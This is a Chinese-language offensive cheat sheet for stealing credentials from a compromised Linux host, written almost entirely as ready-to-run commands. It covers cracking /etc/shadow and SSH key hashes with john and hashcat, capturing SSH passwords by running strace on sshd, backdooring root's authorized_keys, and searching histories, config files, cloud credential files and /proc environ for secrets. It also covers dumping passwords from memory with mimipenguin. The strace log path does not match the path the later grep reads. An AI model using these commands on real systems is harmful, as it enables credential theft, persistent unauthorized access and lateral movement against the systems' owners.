# Linux 认证凭证获取

## 0x00 概述

目标是在 Linux 主机上获取可用于后续横向或提权的认证材料，包括：

- `/etc/shadow` 中的口令散列
- SSH 登录明文
- PAM 链路可截获的凭证

前提通常是已经拿到本机命令执行权限，且具备一定的文件读取、进程调试或替换能力。

## 0x01 获取明文密码

### 1. /etc/shadow中hash破解
```
root:$1$aXmGMjXX$MGrR.Hquwr7UVMwOGOzJV0::0:99999:7:::

```

密码域密文由三部分组成，即：$idsalt$encrypted。当id=1，采用md5进行加密，弱口令容易被破解。
当id为5时，采用SHA256进行加密，id为6时，采用SHA512进行加密，可以通过john进行暴力破解。

### 2.利用Strace调试sshd进程抓登录密码
strace命令
```
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/re/.sshd.log &)
```
通过正则可以查询.sshd.log 密码信息:
```
grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/.sshd.log
```
### 3. 替换pam.so抓取登录密码
条件比较苛刻，要适配操作系统和sshd应用版本。

- [Linux PAM后门：窃取ssh密码及自定义密码登录](https://y4er.com/post/linux-backdoor-pam/)

## 0x02 hash 破解命令

### 1. john

```bash
# 需要 root 或同时可读 /etc/passwd 与 /etc/shadow
unshadow /etc/passwd /etc/shadow > hash.txt

# 用字典破解
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 查看已破解出的明文
john --show hash.txt

# 字典跑完后，叠加规则变形继续爆破（Best64 为常用规则集）
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Best64 hash.txt
```

### 2. hashcat

按 hash 前缀 `$id$` 选择模式号（`$6$`→1800，`$1$`→500，`$2a$/$2b$`→3200）：

```bash
# SHA512crypt $6$（/etc/shadow 现代默认）
hashcat -m 1800 hash.txt dict.txt

# MD5crypt $1$（老系统）
hashcat -m 500 hash.txt dict.txt

# bcrypt
hashcat -m 3200 hash.txt dict.txt

# 叠加规则变形
hashcat -m 1800 hash.txt dict.txt -r /usr/share/hashcat/rules/best64.rule
```

- 模式号速查：https://hashcat.net/wiki/doku.php?id=example_hashes

## 0x03 SSH 私钥窃取

### 1. 私钥文件位置

```bash
ls -al ~/.ssh/
# 常见文件：id_rsa / id_ed25519（私钥）、id_rsa.pub（公钥）
# authorized_keys（允许登录本机的公钥）、known_hosts（本机连过的主机）
```

拿到带口令保护的私钥，可先转格式再用 john 离线破解：

```bash
python /usr/share/john/ssh2john.py id_rsa > rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
```

### 2. known_hosts 利用（发现内网主机）

```bash
cat ~/.ssh/known_hosts
```

known_hosts 记录了目标机器历史 SSH 连过的所有主机，是内网横向时的定位情报；主机名被哈希时可用 `ssh-keygen -H -F <host>` 反查。

### 3. authorized_keys 后门植入

拿到 root 权限后，可植入自己的公钥做持久化：

```bash
# 将攻击者公钥追加到 root 的 authorized_keys
echo 'ssh-rsa AAAA...attacker-pubkey' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chown root:root /root/.ssh/authorized_keys
```

### 4. history 翻找密码

```bash
history | grep -i pass
history | grep -i ssh
cat ~/.bash_history
cat /home/*/.bash_history
```

常见能翻到的形式：`sshpass -p xxx ssh root@1.2.3.4`、`mysql -uroot -pxxx`、`redis-cli -a xxx` 等。

## 0x04 配置与历史凭证搜索

### 1. grep 全盘搜密码

```bash
grep -r 'password' /etc/ /home/ 2>/dev/null | head -50
grep -RniE 'password|passwd|secret|token|api[_-]?key' /var/www /opt /srv 2>/dev/null | head -50
```

### 2. 常见配置文件清单

| 文件 | 典型内容 |
| ---- | ---- |
| `.env` | 数据库 / 邮件 / API 明文密码 |
| `config.php` / `wp-config.php` | 站点与数据库连接凭证 |
| `database.yml` | Rails 等框架的数据库配置 |
| `docker-compose.yml` | 服务环境变量中的密码 |
| `settings.py` | Django SECRET_KEY、数据库配置 |
| `tomcat-users.xml` | Tomcat 管理账号 |

### 3. 云凭证

```bash
# AWS
cat ~/.aws/credentials
cat ~/.aws/config
# Kubernetes（含集群 CA 证书与 token，拿到≈接管集群）
cat ~/.kube/config
# 阿里云 CLI
cat ~/.aliyun/config.json
```

## 0x05 内存凭证提取

### 1. mimipenguin

从进程内存中提取明文密码，原理类似 Windows 的 mimikatz（转储目标进程内存做特征匹配）：

```bash
# https://github.com/huntergregal/mimipenguin
./mimipenguin.sh
```

需要对 sshd、gnome-keyring 等目标进程有读权限；普通用户通常只能提取到自己会话相关的明文。

### 2. /proc 环境变量泄露

进程的环境变量里常带凭证，environ 可读即可取：

```bash
cat /proc/<pid>/environ | tr '\0' '\n'
# 找 root 进程的可读环境变量
ls -al /proc/*/environ 2>/dev/null | grep root
```

数据库、Java 应用、CI 任务的 `environ` 中常出现 `DB_PASSWORD`、`MYSQL_ROOT_PASSWORD` 之类的变量。

## 0x06 注意事项

- 优先判断是“离线口令散列”还是“在线明文截获”场景，两者前提不同。
- 涉及 `sshd` 调试和 `pam.so` 替换时，稳定性风险明显更高。
- 获得散列后先判断算法类型，再决定是否值得做口令破解。

## Ref

-[Linux下登录凭证窃取技巧](https://zyazhb.github.io/2020/09/28/steal-linux/)
- [mimipenguin - Dump cleartext credentials from memory](https://github.com/huntergregal/mimipenguin)
- [hashcat example hashes wiki](https://hashcat.net/wiki/doku.php?id=example_hashes)
